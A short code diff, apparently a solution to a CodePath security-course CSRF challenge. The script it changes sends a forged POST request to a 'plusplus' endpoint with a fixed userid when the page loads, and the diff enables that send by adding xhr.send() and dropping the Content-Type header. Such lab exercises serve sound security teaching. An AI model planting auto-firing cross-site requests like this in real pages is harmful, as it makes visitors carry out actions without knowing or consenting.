@@ -25,7 +25,8 @@
       var url =
         "https://security.codepath.com/user/csrfchallengtwo/plusplus?userid=9464f59d6612758dfdf3985b3f79f9efb804ea10"
       xhr.open("POST", url, true);
-      xhr.setRequestHeader('Content-Type', 'application/json');
+      //xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.send();
     }
     window.onload = codePathXss;
   </script>
